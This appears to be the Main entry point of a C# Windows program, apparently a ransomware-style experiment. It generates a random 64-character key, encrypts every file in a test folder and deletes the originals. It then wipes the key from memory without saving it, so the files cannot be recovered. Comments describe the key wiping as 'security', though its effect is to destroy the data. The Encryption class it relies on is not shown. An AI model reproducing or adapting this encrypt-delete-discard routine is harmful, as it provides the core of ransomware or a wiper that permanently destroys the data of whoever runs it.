using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace S4VEtheD4TE
{
    static class Program
    {
        //  Call this function to remove the key from memory after use for security
        [DllImport("KERNEL32.DLL", EntryPoint = "RtlZeroMemory")]
        public static extern bool ZeroMemory(IntPtr Destination, int Length);

        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.SetHighDpiMode(HighDpiMode.SystemAware);
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Main());

            // Encrypt files
            Encryption encryption = new Encryption();

            // Generates random string
            string password = encryption.RandomString(64);
            //Console.WriteLine(password);

            // For additional security Pin the password of your files
            GCHandle gch = GCHandle.Alloc(password, GCHandleType.Pinned);

            string folderPath = @"C:\encryption_tests";

            foreach (string file in Directory.GetFiles(folderPath, "*.*"))
            {
                // Encrypt the file
                encryption.FileEncrypt(file, password);

                // Deletes original file
                File.Delete(file);
            }

            // To increase the security of the encryption, delete the given password from the memory !
            ZeroMemory(gch.AddrOfPinnedObject(), password.Length * 2);
            gch.Free();
        }
    }
}
